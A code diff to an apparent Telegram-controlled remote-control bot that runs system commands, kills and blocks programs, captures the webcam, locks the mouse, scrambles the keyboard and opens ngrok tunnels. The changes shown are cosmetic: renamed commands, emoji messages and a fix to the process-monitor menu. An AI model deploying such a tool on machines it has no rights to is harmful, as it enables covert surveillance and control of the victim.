@@ -274,8 +274,8 @@ execute - Run system command.
 processkiller - Shows a table of processes that you can kill.
 terminateprocess - Kills a process by name.
 procmonmenu - Shows procmon menu.
-processmonadd - Adds a process to the process monitor list.
-processmonrem - Removes a process to the process monitor list.
+procmonadd - Adds a process to the process monitor list.
+procmonrem - Removes a process to the process monitor list.
 
 📂 File Explorer
 fileexplorer - Displays a file explorer menu.
@@ -1108,7 +1108,7 @@ class PeppinoTelegram:
 
     def cantopen(self, process: str) -> None:
         self.cantopenlist.append(process)
-        self.bsend(f"Added {process} to cantopenlist.")
+        self.bsend(f"🔒 Added {process} to cantopenlist.")
 
     def cantopenkiller(self) -> None:
         while self.running:
@@ -1122,7 +1122,7 @@ class PeppinoTelegram:
             dict_menu = { proc:f"/cantopenremove {proc}" for proc in self.cantopenlist}
             menu = self.new_menu(dict_menu)
         else:
-            self.bsend("cantopenlist is empty.")
+            self.bsend("Cantopenlist is empty.")
 
     def check_if_proc_running(self, processname) -> bool:
         return processname.lower().strip() in [x.name().lower().strip() for  x in psutil.process_iter()]
@@ -1421,10 +1421,15 @@ class PeppinoTelegram:
                     self.mixer_menu_keyboard = None
 
         elif command.startswith("PROCMON"):
-            if command == "PROCMON_close":
-                if self.processmonitormenu:
+            if self.processmonitormenu:
+                if command == "PROCMON_close":
                     self.processmonitormenu.delete()
                     self.processmonitormenu = None
+                elif command.startswith("PROCMON_procmonrem"):
+                    process = function_args[0]
+                    self.processmonitorrem(process)
+                    self.processmonitormenu.delete()
+                    self.processmonitormenushow()
 
         else:
             self.bsend(f"Invalid command {command}")
@@ -1500,17 +1505,19 @@ class PeppinoTelegram:
         self.plankton(audio=False)
     
     def processmonitoradd(self, processname: str) -> None:
+        self.bsend(f"💻 {processname} added to process monitor's list.")
         self.processmonitorlist.update({processname:False})
     
     def processmonitorrem(self, processname: str) -> None:
         try:
             del self.processmonitorlist[processname]
+            self.bsend(f"💻 {processname} removed to process monitor's list.")
         except:
-            pass
+            self.bsend(f"💻 {processname} was not inside process monitor's list.")
 
     def processmonitormenushow(self) -> None:
         self.processmonitormenu = self.new_menu({
-            x:f"processmonitorrem {x}" for x, _ in self.processmonitorlist.items()
+            x:f"PROCMON_procmonrem {x}" for x, _ in self.processmonitorlist.items()
         }, close_btn_lab="PROCMON_close")
 
     def processmonitorloop(self) -> None:
@@ -1519,7 +1526,7 @@ class PeppinoTelegram:
                 if self.check_if_proc_running(process) and not checked:
                     self.bsend(f"{process} is running.")
                     self.processmonitorlist[process]=True
-                else:
+                elif not(self.check_if_proc_running(process)):
                     self.processmonitorlist[process]=False
             sleep(1)
 
@@ -1558,7 +1565,7 @@ class PeppinoTelegram:
         ["/camerawallpaper", "/setvideowallpaper"],
         ["/execute", "/processkiller"],
         ["/terminateprocess", "/procmonmenu"],
-        ["/processmonadd", "/processmonrem"],
+        ["/procmonadd", "/procmonrem"],
         ["/filexplorer"],
         ["/randomkeyboard", "/capslock"],
         ["/mousecontroller", "/mouselock"],
@@ -1759,7 +1766,7 @@ class PeppinoTelegram:
 
     def removefromcantopen(self, process: str) -> None:
         self.cantopenlist.remove(process)
-        self.bsend(f"Removed {process} to cantopenlist.")
+        self.bsend(f"🔒 Removed {process} to cantopenlist.")
 
     def restore_wallpaper(self) -> None:
         change_wallpaper(self.backup_wallpaper_path)
@@ -1813,7 +1820,7 @@ class PeppinoTelegram:
 
     def setCameraAsWallpaper(self, seconds: float|int=5):
         seconds = int(seconds)
-        loading_bar = self.new_loading_bar(label="Set Camera As Wallpaper", total=seconds, showperc=True)
+        loading_bar = self.new_loading_bar(label=f"{emoji_dict['camera']}{emoji_dict['screen']} Set Camera As Wallpaper", total=seconds, showperc=True)
         filename = join(BURN_DIRECTORY, "jxframe.png")
         start = time()
         res = True
@@ -2021,5 +2028,5 @@ if __name__ == "__main__":
         terminate_process_by_name("ngrok.exe")
         ngrok.set_auth_token(ngrok_token)
         close_all_tunnels(ngrok)
-    pep2 = PeppinoTelegram(token,chat_id,ngrok_token,mixer,capture,loading_bar_set=["█","░"],loading_bar_spinner=all_spinners["circle_dots"])
+    pep2 = PeppinoTelegram(token,chat_id,ngrok_token,mixer,capture,loading_bar_set=[emoji_dict["progress"],emoji_dict["empty_progress"]],loading_bar_spinner=all_spinners["circle_dots"])
     pep2.start()
